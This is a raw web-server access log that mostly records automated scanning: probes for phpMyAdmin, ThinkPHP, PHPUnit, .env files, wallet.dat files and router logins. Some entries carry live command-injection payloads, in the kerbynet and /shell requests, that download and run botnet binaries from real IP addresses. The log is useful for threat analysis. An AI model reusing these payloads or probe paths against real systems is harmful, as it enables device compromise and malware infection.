[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.936 ms - 913[0m
[0mGET //PHPMYADMIN/scripts/setup.php [33m404 [0m0.920 ms - 913[0m
[0mGET //db/scripts/setup.php [33m404 [0m0.799 ms - 913[0m
[0mGET //dbadmin/scripts/setup.php [33m404 [0m0.824 ms - 913[0m
[0mGET //myadmin/scripts/setup.php [33m404 [0m0.755 ms - 913[0m
[0mGET //myadmin/scripts/db___.init.php [33m404 [0m0.714 ms - 913[0m
[0mGET //MyAdmin/scripts/db___.init.php [33m404 [0m0.702 ms - 913[0m
[0mGET //mysql/scripts/setup.php [33m404 [0m0.827 ms - 913[0m
[0mGET //mysqladmin/scripts/setup.php [33m404 [0m0.799 ms - 913[0m
[0mGET //pHpMyAdMiN/scripts/setup.php [33m404 [0m0.749 ms - 913[0m
[0mGET //phpMyAdmin/scripts/setup.php [33m404 [0m0.722 ms - 913[0m
[0mGET //phpadmin/scripts/setup.php [33m404 [0m0.732 ms - 913[0m
[0mGET //phpmyadmin/scripts/setup.php [33m404 [0m0.760 ms - 913[0m
[0mGET //phpmyadmin/scripts/db___.init.php [33m404 [0m0.855 ms - 913[0m
[0mGET //phpMyAdmin/scripts/db___.init.php [33m404 [0m0.865 ms - 913[0m
[0mGET //pma/scripts/db___.init.php [33m404 [0m0.861 ms - 913[0m
[0mGET //PMA/scripts/db___.init.php [33m404 [0m0.837 ms - 913[0m
[0mGET //sqladm/scripts/setup.php [33m404 [0m0.864 ms - 913[0m
[0mGET //sqladmin/scripts/setup.php [33m404 [0m3.758 ms - 913[0m
[0mGET //sqlite/main.php [33m404 [0m0.863 ms - 913[0m
[0mGET //SQLiteManager/main.php [33m404 [0m0.830 ms - 913[0m
[0mGET //sqlitemanager/main.php [33m404 [0m0.839 ms - 913[0m
[0mGET //phpmyadmin/scripts/db.init.php [33m404 [0m0.763 ms - 913[0m
[0mGET //phpMyAdmin/scripts/db.init.php [33m404 [0m0.807 ms - 913[0m
[0mGET //MyAdmin/scripts/setup.php [33m404 [0m0.735 ms - 913[0m
[0mGET //database/scripts/setup.php [33m404 [0m0.782 ms - 913[0m
[0mGET //phpAdmin/scripts/setup.php [33m404 [0m1.657 ms - 913[0m
[0mGET //phpmyadmin1/scripts/setup.php [33m404 [0m0.710 ms - 913[0m
[0mGET //phpmyadmin2/scripts/setup.php [33m404 [0m0.728 ms - 913[0m
[0mGET //pma/scripts/setup.php [33m404 [0m0.736 ms - 913[0m
[0mGET //scripts/setup.php [33m404 [0m0.774 ms - 913[0m
[0mGET //scripts/db___.init.php [33m404 [0m0.787 ms - 913[0m
[0mGET //setup.php [33m404 [0m0.667 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.741 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.794 ms - 913[0m
[0mGET / [32m200 [0m0.957 ms - 844[0m
[0mGET / [32m200 [0m2.024 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.759 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.801 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.767 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.767 ms - 913[0m
[0mGET / [32m200 [0m1.007 ms - 844[0m
[0mGET / [32m200 [0m0.762 ms - 844[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.039 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.798 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.803 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.751 ms - 913[0m
[0mGET / [32m200 [0m1.011 ms - 844[0m
[0mGET / [32m200 [0m0.818 ms - 844[0m
[0mGET / [32m200 [0m0.983 ms - 844[0m
[0mGET / [32m200 [0m0.880 ms - 844[0m
[0mGET / [32m200 [0m0.932 ms - 844[0m
[0mGET / [32m200 [0m0.949 ms - 844[0m
[0mGET / [32m200 [0m1.012 ms - 844[0m
[0mGET / [32m200 [0m0.866 ms - 844[0m
[0mGET / [36m304 [0m1.726 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.330 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.429 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.736 ms - 913[0m
[0mGET / [32m200 [0m0.940 ms - 844[0m
[0mGET / [32m200 [0m5.351 ms - 844[0m
[0mGET / [32m200 [0m0.963 ms - 844[0m
[0mGET / [32m200 [0m0.928 ms - 844[0m
[0mGET / [32m200 [0m1.788 ms - 844[0m
[0mGET / [32m200 [0m0.998 ms - 844[0m
[0mGET / [32m200 [0m1.427 ms - 844[0m
[0mGET / [32m200 [0m0.899 ms - 844[0m
[0mGET / [32m200 [0m0.920 ms - 844[0m
[0mGET / [32m200 [0m0.935 ms - 844[0m
[0mGET /hudson [33m404 [0m1.170 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.910 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.955 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.965 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.912 ms - 913[0m
[0mGET / [32m200 [0m0.881 ms - 844[0m
[0mGET /scgi-bin/platform.cgi [33m404 [0m1.650 ms - 913[0m
[0mGET /cgi-bin/p2p.cgi?cmd=p2p.cgi&-action=get [33m404 [0m0.866 ms - 913[0m
[0mGET /cgi-bin/welcome.cgi [33m404 [0m0.887 ms - 913[0m
[0mGET /index.html [33m404 [0m0.903 ms - 913[0m
[0mGET /cgi-bin/webproc [33m404 [0m0.927 ms - 913[0m
[0mGET /webaccess/index.php [33m404 [0m0.832 ms - 913[0m
[0mGET /HNAP1/ [33m404 [0m0.910 ms - 913[0m
[0mGET /common/info.cgi [33m404 [0m0.980 ms - 913[0m
[0mGET /hnap/hnap_service [33m404 [0m0.885 ms - 913[0m
[0mGET /stssys.htm [33m404 [0m0.877 ms - 913[0m
[0mGET /index.asp [33m404 [0m1.691 ms - 913[0m
[0mGET /login.htm [33m404 [0m0.923 ms - 913[0m
[0mGET /webpages/login.html [33m404 [0m0.879 ms - 913[0m
[0mGET /FHFactoryCheck.html [33m404 [0m0.982 ms - 913[0m
[0mGET /login [33m404 [0m0.993 ms - 913[0m
[0mGET /cgi-bin/dispatcher.cgi?cmd=0 [33m404 [0m0.882 ms - 913[0m
[0mGET /cgi-bin/login.asp [33m404 [0m0.927 ms - 913[0m
[0mGET /rpAuth.html [33m404 [0m0.964 ms - 913[0m
[0mGET /login.asp [33m404 [0m1.015 ms - 913[0m
[0mGET /usrlogin.asp [33m404 [0m0.843 ms - 913[0m
[0mGET /login.html [33m404 [0m1.737 ms - 913[0m
[0mGET /index_style.css [33m404 [0m0.962 ms - 913[0m
[0mGET /weblogin.htm [33m404 [0m0.869 ms - 913[0m
[0mGET /login.asp [33m404 [0m0.887 ms - 913[0m
[0mGET /admin/login.jsp [33m404 [0m0.986 ms - 913[0m
[0mGET /client/login [33m404 [0m0.927 ms - 913[0m
[0mGET /upnp.jsp [33m404 [0m0.916 ms - 913[0m
[0mGET /login.asp [33m404 [0m0.923 ms - 913[0m
[0mGET /login.html [33m404 [0m0.905 ms - 913[0m
[0mGET /index.htm [33m404 [0m0.972 ms - 913[0m
[0mGET /login.html [33m404 [0m0.944 ms - 913[0m
[0mGET /home/login.html [33m404 [0m0.879 ms - 913[0m
[0mGET /chinese.js [33m404 [0m0.940 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.964 ms - 913[0m
[0mGET /magis/ [33m404 [0m1.020 ms - 913[0m
[0mGET /common.js [33m404 [0m0.938 ms - 913[0m
[0mGET /home.asp [33m404 [0m0.953 ms - 913[0m
[0mGET /login.html [33m404 [0m0.982 ms - 913[0m
[0mGET /cgi-bin/luci [33m404 [0m0.857 ms - 913[0m
[0mGET / [32m200 [0m0.917 ms - 844[0m
[0mGET /cgi-bin/welcome.cgi [33m404 [0m0.958 ms - 913[0m
[0mGET /cgi-bin/user/Config.cgi?.cab&action=get&category=Account.* [33m404 [0m0.937 ms - 913[0m
[0mGET /system.ini?loginuse&loginpas [33m404 [0m0.899 ms - 913[0m
[0mGET / [32m200 [0m0.928 ms - 844[0m
[0mGET / [32m200 [0m0.929 ms - 844[0m
[0mGET /cgi-bin/luci [33m404 [0m0.909 ms - 913[0m
[0mGET / [32m200 [0m0.917 ms - 844[0m
[0mGET / [32m200 [0m0.688 ms - 844[0m
[0mGET / [32m200 [0m0.935 ms - 844[0m
[0mGET / [32m200 [0m1.060 ms - 844[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.794 ms - 913[0m
[0mGET / [32m200 [0m0.864 ms - 844[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.065 ms - 913[0m
[0mGET / [32m200 [0m0.930 ms - 844[0m
[0mGET / [32m200 [0m0.922 ms - 844[0m
[0mGET / [32m200 [0m0.906 ms - 844[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.913 ms - 913[0m
[0mGET / [32m200 [0m0.887 ms - 844[0m
[0mGET / [32m200 [0m0.924 ms - 844[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.923 ms - 913[0m
[0mGET / [32m200 [0m0.953 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.848 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.811 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.787 ms - 913[0m
[0mGET /backups/wallet.dat [33m404 [0m0.876 ms - 913[0m
[0mGET /Bitcoin/wallet.dat [33m404 [0m0.972 ms - 913[0m
[0mGET /wallet.dat [33m404 [0m0.944 ms - 913[0m
[0mGET /bitcoin/wallet.dat [33m404 [0m0.915 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.780 ms - 913[0m
[0mGET /bitcoin/backup/wallet.dat [33m404 [0m0.896 ms - 913[0m
[0mGET /backup/wallet.dat [33m404 [0m0.942 ms - 913[0m
[0mGET /wallet/wallet.dat [33m404 [0m0.967 ms - 913[0m
[0mGET /backup/bitcoin/wallet.dat [33m404 [0m0.985 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.758 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.785 ms - 913[0m
[0mGET /portal/redlion [33m404 [0m1.561 ms - 913[0m
[0mGET / [32m200 [0m0.917 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.781 ms - 913[0m
[0mGET /.env [33m404 [0m0.847 ms - 913[0m
[0mPOST / [33m404 [0m0.982 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.829 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m3.740 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.748 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.809 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.756 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.783 ms - 913[0m
[0mGET / [32m200 [0m0.913 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.787 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.774 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.726 ms - 913[0m
[0mGET /.env [33m404 [0m0.816 ms - 913[0m
[0mPOST / [33m404 [0m1.023 ms - 913[0m
[0mGET / [32m200 [0m1.008 ms - 844[0m
[0mGET / [32m200 [0m0.874 ms - 844[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.944 ms - 913[0m
[0mGET / [32m200 [0m0.927 ms - 844[0m
[0mGET / [32m200 [0m0.917 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.858 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.996 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.920 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m1.808 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.966 ms - 913[0m
[0mGET / [32m200 [0m0.908 ms - 844[0m
[0mGET / [32m200 [0m0.914 ms - 844[0m
[0mGET / [32m200 [0m0.987 ms - 844[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.997 ms - 913[0m
[0mGET / [32m200 [0m0.954 ms - 844[0m
[0mGET /.env [33m404 [0m0.934 ms - 913[0m
[0mPOST / [33m404 [0m1.066 ms - 913[0m
[0mGET / [36m304 [0m1.795 ms - -[0m
[0mGET /stylesheets/style.css [36m304 [0m0.338 ms - -[0m
[0mGET /css/bootstrap.min.css [36m304 [0m0.407 ms - -[0m
[0mGET /favicon.ico [33m404 [0m0.702 ms - 913[0m
[0mGET / [32m200 [0m0.947 ms - 844[0m
[0mPOST /api/jsonws/invoke [33m404 [0m1.023 ms - 913[0m
[0mGET /TP/public/index.php [33m404 [0m0.916 ms - 913[0m
[0mGET /TP/index.php [33m404 [0m0.893 ms - 913[0m
[0mGET /thinkphp/html/public/index.php [33m404 [0m0.949 ms - 913[0m
[0mGET /html/public/index.php [33m404 [0m0.940 ms - 913[0m
[0mGET /public/index.php [33m404 [0m0.914 ms - 913[0m
[0mGET /TP/html/public/index.php [33m404 [0m1.842 ms - 913[0m
[0mGET /elrekt.php [33m404 [0m0.925 ms - 913[0m
[0mGET /index.php [33m404 [0m0.881 ms - 913[0m
[0mGET / [32m200 [0m0.971 ms - 844[0m
[0mGET /hudson [33m404 [0m5.747 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.974 ms - 913[0m
[0mGET / [32m200 [0m0.960 ms - 844[0m
[0mGET / [32m200 [0m5.641 ms - 844[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.917 ms - 913[0m
[0mGET / [32m200 [0m0.921 ms - 844[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.990 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.848 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.887 ms - 913[0m
[0mGET / [32m200 [0m0.916 ms - 844[0m
[0mGET / [32m200 [0m0.673 ms - 844[0m
[0mGET / [32m200 [0m0.967 ms - 844[0m
[0mGET / [32m200 [0m0.813 ms - 844[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.900 ms - 913[0m
[0mGET /manager/html [33m404 [0m0.960 ms - 913[0m
[0mGET / [32m200 [0m1.669 ms - 844[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.956 ms - 913[0m
[0mGET / [32m200 [0m0.872 ms - 844[0m
[0mGET / [32m200 [0m0.927 ms - 844[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m1.039 ms - 913[0m
[0mGET / [32m200 [0m0.936 ms - 844[0m
[0mGET / [32m200 [0m0.900 ms - 844[0m
[0mGET / [32m200 [0m0.916 ms - 844[0m
[0mGET / [32m200 [0m0.946 ms - 844[0m
[0mGET / [32m200 [0m1.694 ms - 844[0m
[0mGET / [32m200 [0m0.683 ms - 844[0m
[0mGET / [32m200 [0m0.844 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.744 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.771 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.747 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.738 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.818 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.785 ms - 913[0m
[0mGET / [32m200 [0m0.865 ms - 844[0m
[0mGET / [32m200 [0m1.799 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.747 ms - 913[0m
[0mGET / [36m304 [0m0.910 ms - -[0m
[0mGET /.env [33m404 [0m0.819 ms - 913[0m
[0mPOST / [33m404 [0m0.919 ms - 913[0m
[0mGET / [32m200 [0m0.956 ms - 844[0m
[0mGET / [32m200 [0m0.759 ms - 844[0m
[0mGET / [32m200 [0m0.890 ms - 844[0m
[0mGET / [32m200 [0m0.966 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.759 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m1.593 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.772 ms - 913[0m
[0mGET /portal/redlion [33m404 [0m0.896 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.798 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.759 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.854 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.838 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.759 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.747 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.762 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.934 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m1.749 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.828 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.854 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.028 ms - 913[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.911 ms - 913[0m
[0mPOST /ajax/render/widget_tabbedcontainer_tab_panel [33m404 [0m1.013 ms - 913[0m
[0mGET / [32m200 [0m0.901 ms - 844[0m
[0mGET / [32m200 [0m0.909 ms - 844[0m
[0mGET / [32m200 [0m0.897 ms - 844[0m
[0mGET / [32m200 [0m1.709 ms - 844[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.952 ms - 913[0m
[0mGET / [32m200 [0m0.884 ms - 844[0m
[0mGET / [32m200 [0m0.895 ms - 844[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.968 ms - 913[0m
[0mGET / [32m200 [0m0.883 ms - 844[0m
[0mGET / [32m200 [0m0.984 ms - 844[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.912 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.672 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.675 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.511 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.962 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.737 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.688 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.961 ms - 913[0m
[0mGET / [32m200 [0m0.908 ms - 844[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.896 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.769 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.857 ms - 913[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.990 ms - 913[0m
[0mGET / [32m200 [0m1.633 ms - 844[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m1.009 ms - 913[0m
[0mGET / [32m200 [0m0.923 ms - 844[0m
[0mGET / [32m200 [0m0.873 ms - 844[0m
[0mGET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 [33m404 [0m0.898 ms - 913[0m
[0mGET / [32m200 [0m5.319 ms - 844[0m
[0mGET /hudson [33m404 [0m0.921 ms - 913[0m
[0mGET / [32m200 [0m0.907 ms - 844[0m
[0mGET / [32m200 [0m0.891 ms - 844[0m
[0mGET / [32m200 [0m1.774 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.735 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.732 ms - 913[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m0.918 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.876 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.873 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.896 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.832 ms - 913[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.885 ms - 913[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.957 ms - 913[0m
[0mGET / [32m200 [0m1.723 ms - 844[0m
[0mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.997 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.829 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.742 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.745 ms - 913[0m
[0mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php [33m404 [0m0.958 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.778 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.784 ms - 913[0m
[0mGET / [32m200 [0m0.972 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.740 ms - 913[0m
[0mGET / [32m200 [0m1.819 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.889 ms - 913[0m
[0mGET / [32m200 [0m0.978 ms - 844[0m
[0mGET / [32m200 [0m0.719 ms - 844[0m
[0mGET / [32m200 [0m0.869 ms - 844[0m
[0mGET / [32m200 [0m0.935 ms - 844[0m
[0mGET /robots.txt [33m404 [0m0.982 ms - 913[0m
[0mGET /sitemap.xml [33m404 [0m0.891 ms - 913[0m
[0mGET /.well-known/security.txt [33m404 [0m0.973 ms - 913[0m
[0mGET /favicon.ico [33m404 [0m0.878 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m1.524 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.769 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.835 ms - 913[0m
[0mGET /portal/redlion [33m404 [0m0.893 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.763 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.832 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.771 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.697 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.817 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.789 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.749 ms - 913[0m
[0mGET / [32m200 [0m1.659 ms - 844[0m
[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m1.004 ms - 913[0m
[0mGET / [32m200 [0m0.838 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.724 ms - 913[0m
[0mGET http://example.com/ [32m200 [0m0.936 ms - 844[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m0.910 ms - 913[0m
[0mGET / [32m200 [0m0.976 ms - 844[0m
[0mGET / [32m200 [0m0.785 ms - 844[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws [0m- [0m- ms - -[0m
[0mGET /solr/admin/info/system?wt=json [33m404 [0m1.736 ms - 913[0m
[0mGET /?XDEBUG_SESSION_START=phpstorm [32m200 [0m0.950 ms - 844[0m
[0mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> [32m200 [0m0.878 ms - 844[0m
[0mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP [33m404 [0m0.975 ms - 913[0m
[0mGET / [32m200 [0m0.954 ms - 844[0m
[0mGET /shell?cd+/tmp;rm+-rf+*;wget+185.132.53.147/hakaibin/h4k4i.arm7;chmod+777+/tmp/h4k4i.arm7;sh+/tmp/h4k4i.arm7+hakai.Rep.Jaws [0m- [0m- ms - -[0m
[0mPOST /api/jsonws/invoke [33m404 [0m0.941 ms - 913[0m
[0mGET / [32m200 [0m0.875 ms - 844[0m
[0mGET /.env [33m404 [0m0.825 ms - 913[0m
[0mPOST / [33m404 [0m0.818 ms - 913[0m
[0mGET http://example.com/ [32m200 [0m1.803 ms - 844[0m
[0mGET / [32m200 [0m0.978 ms - 844[0m
[0mGET /ReportServer [33m404 [0m0.886 ms - 913[0m
[0mGET /hudson [33m404 [0m0.885 ms - 913[0m
[0mGET / [32m200 [0m0.884 ms - 844[0m
[0mGET / [32m200 [0m0.884 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.686 ms - 913[0m
[0mGET / [32m200 [0m0.888 ms - 844[0m
[0mGET / [32m200 [0m0.882 ms - 844[0m
[0mPOST /boaform/admin/formLogin [33m404 [0m1.014 ms - 913[0m
[0mGET / [32m200 [0m1.633 ms - 844[0m
[0mGET /favicon.ico [33m404 [0m0.739 ms - 913[0m
[0mGET / [32m200 [0m0.929 ms - 844[0m
[0mGET / [32m200 [0m0.974 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.804 ms - 913[0m
[0mGET / [32m200 [0m0.973 ms - 844[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.881 ms - 913[0m
[0mPOST /UpgradeManager/sns/message/receive [33m404 [0m0.754 ms - 913[0m
[0mGET / [32m200 [0m0.937 ms - 844[0m
[0mGET /stylesheets/style.css [32m200 [0m0.516 ms - 111[0m
[0mGET /css/bootstrap.min.css [32m200 [0m1.642 ms - 160302[0m
[0mGET /favicon.ico [33m404 [0m0.886 ms - 913[0m
[0mGET / [32m200 [0m0.877 ms - 844[0m
[0mGET /stylesheets/style.css [32m200 [0m0.527 ms - 111[0m
